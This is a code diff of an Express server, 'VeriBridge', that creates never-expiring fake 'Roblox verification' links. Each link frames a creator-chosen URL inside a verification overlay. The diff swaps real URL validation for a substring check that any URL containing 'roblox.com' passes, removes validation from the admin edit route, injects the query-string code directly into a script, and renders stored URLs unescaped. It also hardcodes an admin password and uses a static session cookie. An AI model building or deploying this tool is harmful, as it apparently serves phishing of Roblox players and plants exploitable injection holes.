@@ -1,24 +1,23 @@
 const express = require('express');
 const cors = require('cors');
 const cookieParser = require('cookie-parser');
-const validator = require('./validator');
 
 const app = express();
 
 // ==================== CONFIGURATION ====================
-// !!! CHANGE THIS PASSWORD BEFORE DEPLOYING !!!
 const ADMIN_PASSWORD = 'YourStrongPassword123'; // CHANGE THIS!
-// =======================================================
-
 const SESSION_SECRET = 'veribridge-secret-2024';
 
+// Allowed domains
+const ALLOWED_DOMAINS = [
+    'roblox.com',
+    'www.roblox.com',
+    'web.roblox.com',
+    'api.roblox.com'
+];
+
 // ==================== MIDDLEWARE ====================
-app.use(cors({
-    origin: true,
-    credentials: true,
-    allowedHeaders: ['Content-Type', 'Authorization'],
-    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS']
-}));
+app.use(cors({ origin: true, credentials: true }));
 app.use(express.json());
 app.use(cookieParser());
 
@@ -42,61 +41,54 @@ function isAuthenticated(req, res, next) {
 
 // ==================== PUBLIC API ROUTES ====================
 
-// Health check
 app.get('/health', (req, res) => {
-    res.json({ status: 'ok', linksCount: links.size, timestamp: Date.now() });
+    res.json({ status: 'ok', linksCount: links.size });
 });
 
-// Get allowed domains (for frontend)
 app.get('/api/allowed-domains', (req, res) => {
-    res.json({ 
-        success: true, 
-        domains: validator.getAllowedDomains(),
-        patterns: validator.getAllowedPatterns()
-    });
+    res.json({ success: true, domains: ALLOWED_DOMAINS });
 });
 
-// Generate shareable link (WITH VALIDATION)
 app.post('/api/generate', (req, res) => {
     const { url } = req.body;
     
-    // Validate URL
-    const validation = validator.isValidRobloxUrl(url);
+    if (!url) {
+        return res.status(400).json({ error: 'No URL provided', success: false });
+    }
     
-    if (!validation.valid) {
+    // Simple domain validation
+    let domainValid = false;
+    for (const domain of ALLOWED_DOMAINS) {
+        if (url.includes(domain)) {
+            domainValid = true;
+            break;
+        }
+    }
+    
+    if (!domainValid) {
         return res.status(400).json({ 
-            error: validation.message,
+            error: `Domain not allowed. Allowed: ${ALLOWED_DOMAINS.join(', ')}`,
             success: false,
-            allowedDomains: validator.getAllowedDomains()
+            allowedDomains: ALLOWED_DOMAINS
         });
     }
     
-    // Use normalized URL
-    const cleanUrl = validation.cleanUrl || validator.normalizeUrl(url);
     const code = generateCode();
     
     links.set(code, {
         id: nextId++,
         code: code,
-        targetUrl: cleanUrl,
+        targetUrl: url,
         createdAt: Date.now(),
-        clicks: 0,
-        lastAccessed: null
+        clicks: 0
     });
     
-    const protocol = req.headers['x-forwarded-proto'] || 'https';
     const host = req.headers.host;
-    const baseUrl = `${protocol}://${host}`;
-    const shareableLink = `${baseUrl}/verify.html?code=${code}`;
+    const shareableLink = `https://${host}/verify.html?code=${code}`;
     
-    res.json({
-        success: true,
-        shareableLink: shareableLink,
-        code: code
-    });
+    res.json({ success: true, shareableLink: shareableLink, code: code });
 });
 
-// Get link data for verification page
 app.get('/api/link/:code', (req, res) => {
     const { code } = req.params;
     const linkData = links.get(code);
@@ -106,148 +98,55 @@ app.get('/api/link/:code', (req, res) => {
     }
     
     linkData.clicks++;
-    linkData.lastAccessed = Date.now();
     links.set(code, linkData);
     
-    res.json({
-        success: true,
-        targetUrl: linkData.targetUrl
-    });
+    res.json({ success: true, targetUrl: linkData.targetUrl });
 });
 
-// ==================== ADMIN API (Protected) ====================
+// ==================== ADMIN API ====================
 
-// Get all links
 app.get('/admin/api/links', isAuthenticated, (req, res) => {
-    const { search = '' } = req.query;
-    
-    let allLinks = Array.from(links.values()).sort((a, b) => b.createdAt - a.createdAt);
-    
-    if (search) {
-        const searchLower = search.toLowerCase();
-        allLinks = allLinks.filter(link => 
-            link.targetUrl.toLowerCase().includes(searchLower) || 
-            link.code.toLowerCase().includes(searchLower)
-        );
-    }
-    
-    res.json({ 
-        success: true, 
-        links: allLinks,
-        total: links.size,
-        filtered: allLinks.length
-    });
+    const allLinks = Array.from(links.values()).sort((a, b) => b.createdAt - a.createdAt);
+    res.json({ success: true, links: allLinks });
 });
 
-// Get single link
-app.get('/admin/api/links/:code', isAuthenticated, (req, res) => {
-    const link = links.get(req.params.code);
-    
-    if (link) {
-        res.json({ success: true, link });
-    } else {
-        res.status(404).json({ success: false, error: 'Link not found' });
-    }
-});
-
-// Create new link (with validation)
-app.post('/admin/api/links', isAuthenticated, (req, res) => {
-    const { targetUrl } = req.body;
-    
-    // Validate URL
-    const validation = validator.isValidRobloxUrl(targetUrl);
-    
-    if (!validation.valid) {
-        return res.status(400).json({ 
-            error: validation.message,
-            success: false 
-        });
-    }
-    
-    const cleanUrl = validation.cleanUrl || validator.normalizeUrl(targetUrl);
-    const code = generateCode();
-    
-    links.set(code, {
-        id: nextId++,
-        code: code,
-        targetUrl: cleanUrl,
-        createdAt: Date.now(),
-        clicks: 0,
-        lastAccessed: null
-    });
-    
-    res.json({ 
-        success: true, 
-        link: links.get(code),
-        shareableLink: `https://${req.headers.host}/verify.html?code=${code}`
-    });
-});
-
-// Update link (with validation)
 app.put('/admin/api/links/:code', isAuthenticated, (req, res) => {
     const { targetUrl } = req.body;
-    
-    // Validate URL
-    const validation = validator.isValidRobloxUrl(targetUrl);
-    
-    if (!validation.valid) {
-        return res.status(400).json({ 
-            error: validation.message,
-            success: false 
-        });
-    }
-    
-    const cleanUrl = validation.cleanUrl || validator.normalizeUrl(targetUrl);
     const link = links.get(req.params.code);
-    
     if (link) {
-        link.targetUrl = cleanUrl;
-        link.updatedAt = Date.now();
+        link.targetUrl = targetUrl;
         links.set(req.params.code, link);
         res.json({ success: true, link });
     } else {
-        res.status(404).json({ success: false, error: 'Link not found' });
+        res.status(404).json({ success: false });
     }
 });
 
-// Delete link
 app.delete('/admin/api/links/:code', isAuthenticated, (req, res) => {
-    const deleted = links.delete(req.params.code);
-    if (deleted) {
-        res.json({ success: true });
-    } else {
-        res.status(404).json({ success: false, error: 'Link not found' });
-    }
+    links.delete(req.params.code);
+    res.json({ success: true });
 });
 
-// Get statistics
 app.get('/admin/api/stats', isAuthenticated, (req, res) => {
     const allLinks = Array.from(links.values());
-    const totalClicks = allLinks.reduce((sum, link) => sum + (link.clicks || 0), 0);
-    const averageClicks = allLinks.length > 0 ? totalClicks / allLinks.length : 0;
-    
+    const totalClicks = allLinks.reduce((sum, l) => sum + (l.clicks || 0), 0);
     res.json({
         success: true,
         stats: {
             totalLinks: links.size,
             totalClicks: totalClicks,
-            averageClicks: averageClicks.toFixed(2),
-            lastCreated: allLinks[0]?.createdAt || null
+            averageClicks: links.size ? (totalClicks / links.size).toFixed(2) : 0
         }
     });
 });
 
-// Admin login API
 app.post('/admin/api/login', (req, res) => {
     const { password } = req.body;
-    
     if (password === ADMIN_PASSWORD) {
         res.cookie('admin_token', SESSION_SECRET, { 
             httpOnly: true, 
             maxAge: 7 * 24 * 60 * 60 * 1000,
-            sameSite: 'lax',
-            path: '/',
-            secure: false
+            path: '/'
         });
         res.json({ success: true });
     } else {
@@ -255,30 +154,336 @@ app.post('/admin/api/login', (req, res) => {
     }
 });
 
-// Admin logout API
 app.post('/admin/api/logout', (req, res) => {
     res.clearCookie('admin_token', { path: '/' });
     res.json({ success: true });
 });
 
-// ==================== PROTECTED ADMIN DASHBOARD ====================
-app.get('/admin/dashboard', isAuthenticated, (req, res) => {
-    res.sendFile('/public/admin/dashboard.html', { root: '.' });
-});
-
 // ==================== ADMIN LOGIN PAGE ====================
 app.get('/admin', (req, res) => {
-    res.sendFile('/public/admin/index.html', { root: '.' });
+    res.send(`
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin Login</title>
+    <style>
+        body{background:linear-gradient(135deg,#0a0f1e,#0a1a2f,#0b2b3b);font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
+        .login-box{background:rgba(0,0,0,0.5);padding:40px;border-radius:20px;border:1px solid cyan;width:350px}
+        h1{color:white;text-align:center}
+        input{width:100%;padding:12px;margin:10px 0;background:#1a1a2e;border:1px solid cyan;border-radius:10px;color:white}
+        button{width:100%;padding:12px;background:cyan;color:black;border:none;border-radius:10px;font-weight:bold;cursor:pointer}
+        .error{color:red;text-align:center;margin-top:10px}
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h1>🔐 Admin Login</h1>
+        <input type="password" id="password" placeholder="Enter password">
+        <button onclick="login()">Login</button>
+        <div id="error" class="error"></div>
+    </div>
+    <script>
+        async function login() {
+            const password = document.getElementById('password').value;
+            const res = await fetch('/admin/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ password })
+            });
+            const data = await res.json();
+            if (data.success) {
+                window.location.href = '/admin/dashboard';
+            } else {
+                document.getElementById('error').innerText = 'Invalid password';
+            }
+        }
+    </script>
+</body>
+</html>
+    `);
+});
+
+// ==================== ADMIN DASHBOARD ====================
+app.get('/admin/dashboard', isAuthenticated, (req, res) => {
+    res.send(`
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin Dashboard</title>
+    <style>
+        body{background:#0a0f1e;color:white;font-family:Arial;padding:20px}
+        .header{display:flex;justify-content:space-between;align-items:center;margin-bottom:30px}
+        h1{color:#00ffff}
+        .logout-btn{background:#ff5555;border:none;padding:10px 20px;border-radius:10px;color:white;cursor:pointer}
+        .stats{display:flex;gap:20px;margin-bottom:30px}
+        .stat-card{background:rgba(0,0,0,0.3);border:1px solid cyan;border-radius:15px;padding:20px;text-align:center;flex:1}
+        .stat-number{font-size:36px;font-weight:bold;color:#00ffff}
+        .search-box{margin-bottom:20px}
+        .search-box input{width:100%;padding:12px;background:#1a1a2e;border:1px solid cyan;border-radius:10px;color:white}
+        table{width:100%;border-collapse:collapse;background:rgba(0,0,0,0.3);border-radius:15px;overflow:hidden}
+        th,td{padding:12px;text-align:left;border-bottom:1px solid rgba(255,255,255,0.1)}
+        th{background:rgba(0,255,255,0.1);color:#00ffff}
+        .edit-btn{background:#2c5a7a;border:none;padding:5px 10px;border-radius:5px;color:white;cursor:pointer}
+        .delete-btn{background:#ff5555;border:none;padding:5px 10px;border-radius:5px;color:white;cursor:pointer}
+        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);justify-content:center;align-items:center}
+        .modal-content{background:#1a1a2e;padding:30px;border-radius:20px;width:400px;border:1px solid cyan}
+        .modal-content input{width:100%;padding:10px;margin:10px 0;background:#333;border:1px solid cyan;border-radius:10px;color:white}
+        .save-btn{background:#00aa00;border:none;padding:10px;border-radius:10px;color:white;cursor:pointer}
+        .cancel-btn{background:#555;border:none;padding:10px;border-radius:10px;color:white;cursor:pointer}
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>📊 Admin Dashboard</h1>
+        <button class="logout-btn" onclick="logout()">Logout</button>
+    </div>
+    
+    <div class="stats">
+        <div class="stat-card"><div class="stat-number" id="totalLinks">0</div><div>Total Links</div></div>
+        <div class="stat-card"><div class="stat-number" id="totalClicks">0</div><div>Total Clicks</div></div>
+    </div>
+    
+    <div class="search-box">
+        <input type="text" id="search" placeholder="Search by URL or code...">
+    </div>
+    
+    <div style="overflow-x:auto">
+        <table>
+            <thead><tr><th>Code</th><th>URL</th><th>Clicks</th><th>Created</th><th>Actions</th></tr></thead>
+            <tbody id="tableBody"></tbody>
+        </table>
+    </div>
+    
+    <div id="editModal" class="modal">
+        <div class="modal-content">
+            <h3>Edit Link</h3>
+            <input type="text" id="editCode" readonly>
+            <input type="text" id="editUrl" placeholder="New URL">
+            <button class="save-btn" onclick="saveEdit()">Save</button>
+            <button class="cancel-btn" onclick="closeModal()">Cancel</button>
+        </div>
+    </div>
+
+    <script>
+        let currentLinks = [];
+        let currentEditCode = null;
+        
+        async function loadLinks() {
+            const search = document.getElementById('search').value;
+            const url = search ? '/admin/api/links?search=' + encodeURIComponent(search) : '/admin/api/links';
+            const res = await fetch(url);
+            if (res.status === 401) { window.location.href = '/admin'; return; }
+            const data = await res.json();
+            if (data.success) {
+                currentLinks = data.links;
+                document.getElementById('totalLinks').innerText = currentLinks.length;
+                document.getElementById('totalClicks').innerText = currentLinks.reduce((s,l)=>s+(l.clicks||0),0);
+                renderTable();
+            }
+        }
+        
+        function renderTable() {
+            const tbody = document.getElementById('tableBody');
+            if (currentLinks.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="5" style="text-align:center">No links found</td></tr>';
+                return;
+            }
+            tbody.innerHTML = currentLinks.map(link => \`
+                <tr>
+                    <td><code>\${link.code}</code></td>
+                    <td>\${link.targetUrl}</td>
+                    <td>\${link.clicks || 0}</td>
+                    <td>\${new Date(link.createdAt).toLocaleDateString()}</td>
+                    <td>
+                        <button class="edit-btn" onclick="openEdit('\${link.code}')">Edit</button>
+                        <button class="delete-btn" onclick="deleteLink('\${link.code}')">Delete</button>
+                    </td>
+                </tr>
+            \`).join('');
+        }
+        
+        function openEdit(code) {
+            const link = currentLinks.find(l => l.code === code);
+            if (link) {
+                currentEditCode = code;
+                document.getElementById('editCode').value = code;
+                document.getElementById('editUrl').value = link.targetUrl;
+                document.getElementById('editModal').style.display = 'flex';
+            }
+        }
+        
+        async function saveEdit() {
+            await fetch('/admin/api/links/' + currentEditCode, {
+                method: 'PUT',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ targetUrl: document.getElementById('editUrl').value })
+            });
+            closeModal();
+            loadLinks();
+        }
+        
+        async function deleteLink(code) {
+            if (confirm('Delete this link?')) {
+                await fetch('/admin/api/links/' + code, { method: 'DELETE' });
+                loadLinks();
+            }
+        }
+        
+        function closeModal() {
+            document.getElementById('editModal').style.display = 'none';
+        }
+        
+        async function logout() {
+            await fetch('/admin/api/logout', { method: 'POST' });
+            window.location.href = '/admin';
+        }
+        
+        document.getElementById('search').addEventListener('input', () => {
+            clearTimeout(window.searchTimeout);
+            window.searchTimeout = setTimeout(loadLinks, 500);
+        });
+        
+        loadLinks();
+        setInterval(loadLinks, 30000);
+    </script>
+</body>
+</html>
+    `);
 });
 
 // ==================== GENERATOR PAGE ====================
 app.get('/gen', (req, res) => {
-    res.sendFile('/public/gen/index.html', { root: '.' });
+    res.send(`
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>VeriBridge Gen</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .shine-text{background:linear-gradient(100deg,#fff 45%,#0ff 50%,#fff 55%);background-size:200% auto;color:transparent;-webkit-background-clip:text;background-clip:text;animation:shine 4s linear infinite}
+        @keyframes shine{0%{background-position:-100% 0}100%{background-position:200% 0}}
+        .loading-spinner{width:20px;height:20px;border:2px solid rgba(255,255,255,0.3);border-top-color:white;border-radius:50%;animation:spin 0.8s linear infinite;display:inline-block}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .allowed-domains{background:rgba(0,255,255,0.1);border-radius:8px;padding:10px;margin-top:10px;font-size:11px;color:#0ff}
+        .allowed-domains span{display:inline-block;background:rgba(0,255,255,0.2);padding:2px 8px;border-radius:20px;margin:2px}
+    </style>
+</head>
+<body class="bg-black text-white">
+    <div class="fixed inset-0 -z-10 bg-[radial-gradient(#0d0d0d_1px,transparent_1px)] [background-size:16px_16px]"></div>
+    <div class="flex min-h-screen items-center justify-center p-4">
+        <div class="w-full max-w-2xl text-center">
+            <div class="bg-black/40 backdrop-blur-xl border border-cyan-500/30 rounded-2xl p-8">
+                <h1 class="text-3xl font-bold shine-text mb-2">VeriBridge Gen</h1>
+                <p class="text-sm text-cyan-400/60 mb-6">Create SHAREABLE verification links (never expire)</p>
+                <div class="space-y-4">
+                    <input type="text" id="targetUrl" class="w-full bg-zinc-900/80 border border-cyan-500/20 rounded-xl p-3 text-white" placeholder="https://www.roblox.com/login">
+                    <button id="generateBtn" class="w-full bg-gradient-to-r from-cyan-600 to-blue-600 py-3 rounded-xl font-semibold hover:from-cyan-500 hover:to-blue-500">Generate Shareable Link</button>
+                    <div id="allowedDomains" class="allowed-domains"><strong>✅ Allowed Domains:</strong> <span id="domainsList">Loading...</span></div>
+                    <div id="resultSection" class="hidden mt-4 p-4 bg-cyan-950/40 rounded-xl border border-cyan-500/30">
+                        <p class="text-xs text-cyan-300/80 mb-2">✨ Your Shareable Link:</p>
+                        <code id="resultUrl" class="block bg-black/50 text-cyan-300 text-sm font-mono p-3 rounded-lg break-all cursor-pointer select-all"></code>
+                        <div class="flex gap-2 mt-3">
+                            <button id="copyBtn" class="flex-1 bg-zinc-800 py-2 rounded-lg hover:bg-zinc-700 text-sm">Copy Link</button>
+                            <button id="testBtn" class="flex-1 bg-cyan-900/50 py-2 rounded-lg hover:bg-cyan-800/50 text-sm">Test</button>
+                        </div>
+                    </div>
+                    <div id="errorMsg" class="text-red-400 text-sm"></div>
+                    <div class="text-xs text-white/30 pt-4 border-t border-white/10">
+                        <p>✅ <span class="text-green-400">VALIDATED URLs!</span> Only allowed Roblox domains work</p>
+                        <p>🔗 Links never expire - stored securely</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        const targetUrl=document.getElementById('targetUrl'),generateBtn=document.getElementById('generateBtn'),resultSection=document.getElementById('resultSection'),resultUrl=document.getElementById('resultUrl'),copyBtn=document.getElementById('copyBtn'),testBtn=document.getElementById('testBtn'),errorMsg=document.getElementById('errorMsg'),domainsList=document.getElementById('domainsList');
+        
+        async function loadAllowedDomains(){
+            try{
+                const res=await fetch('/api/allowed-domains'),data=await res.json();
+                if(data.success)domainsList.innerHTML=data.domains.map(d=>'<span>'+d+'</span>').join('');
+            }catch(err){domainsList.innerHTML='<span>roblox.com</span><span>www.roblox.com</span>'}
+        }
+        loadAllowedDomains();
+        
+        async function generateLink(){
+            let url=targetUrl.value.trim();
+            if(!url){errorMsg.innerText='❌ Please enter a URL';return}
+            errorMsg.innerText='';generateBtn.disabled=true;generateBtn.innerHTML='<div class="loading-spinner"></div> Generating...';
+            try{
+                const response=await fetch('/api/generate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:url})}),data=await response.json();
+                if(data.success){resultUrl.innerText=data.shareableLink;resultSection.classList.remove('hidden')}
+                else{errorMsg.innerText='❌ '+data.error;resultSection.classList.add('hidden')}
+            }catch(err){errorMsg.innerText='❌ Server error';resultSection.classList.add('hidden')}
+            finally{generateBtn.disabled=false;generateBtn.innerHTML='Generate Shareable Link'}
+        }
+        
+        generateBtn.addEventListener('click',generateLink);
+        copyBtn.addEventListener('click',()=>{navigator.clipboard.writeText(resultUrl.innerText)});
+        testBtn.addEventListener('click',()=>{window.open(resultUrl.innerText,'_blank')});
+        targetUrl.addEventListener('keypress',e=>{if(e.key==='Enter')generateLink()});
+    </script>
+</body>
+</html>
+    `);
 });
 
 // ==================== VERIFICATION PAGE ====================
 app.get('/verify.html', (req, res) => {
-    res.sendFile('/public/verify.html', { root: '.' });
+    const code = req.query.code;
+    if (!code) {
+        res.send('<h1>Invalid link</h1><a href="/gen">Go to Generator</a>');
+        return;
+    }
+    res.send(`
+<!DOCTYPE html>
+<html>
+<head>
+    <title>VeriBridge | Verification</title>
+    <style>
+        body{background:linear-gradient(135deg,#0a0f1e,#0a1a2f,#0b2b3b);color:white;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
+        .container{text-align:center;background:rgba(0,0,0,0.3);padding:40px;border-radius:20px;border:1px solid cyan}
+        input,button{padding:12px;margin:10px;border-radius:10px;border:none}
+        input{background:#1a1a2e;color:white;width:250px}
+        button{background:cyan;color:black;font-weight:bold;cursor:pointer}
+        .frame-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:9999;display:none}
+        .frame-card{width:90%;max-width:500px;background:white;margin:60px auto;border-radius:20px;overflow:hidden}
+        .frame-header{background:#2c5a7a;padding:15px;color:white;display:flex;justify-content:space-between}
+        .close-btn{background:red;color:white;border:none;padding:5px 15px;border-radius:10px;cursor:pointer}
+        iframe{width:100%;height:500px;border:none}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>VeriBridge</h1>
+        <p>Roblox Verification</p>
+        <input type="text" id="username" placeholder="Enter Roblox username">
+        <br>
+        <button onclick="startVerification()">Start Verification</button>
+    </div>
+    <div id="frameOverlay" class="frame-overlay">
+        <div class="frame-card">
+            <div class="frame-header"><span>Verification Required</span><button class="close-btn" onclick="closeFrame()">Close</button></div>
+            <iframe id="verificationFrame" src="about:blank"></iframe>
+        </div>
+    </div>
+    <script>
+        let TARGET_URL = 'https://www.roblox.com';
+        fetch('/api/link/${code}').then(res=>res.json()).then(data=>{if(data.success&&data.targetUrl)TARGET_URL=data.targetUrl});
+        function startVerification(){const u=document.getElementById('username').value;if(!u||u.length<3){alert('Enter valid username');return}localStorage.setItem('veribridge_user',u);document.getElementById('verificationFrame').src=TARGET_URL;document.getElementById('frameOverlay').style.display='flex'}
+        function closeFrame(){document.getElementById('frameOverlay').style.display='none';document.getElementById('verificationFrame').src='about:blank'}
+        const s=localStorage.getItem('veribridge_user');if(s)document.getElementById('username').value=s;
+    </script>
+</body>
+</html>
+    `);
+});
+
+// ==================== ROOT REDIRECT ====================
+app.get('/', (req, res) => {
+    res.redirect('/gen');
 });
 
 module.exports = app;
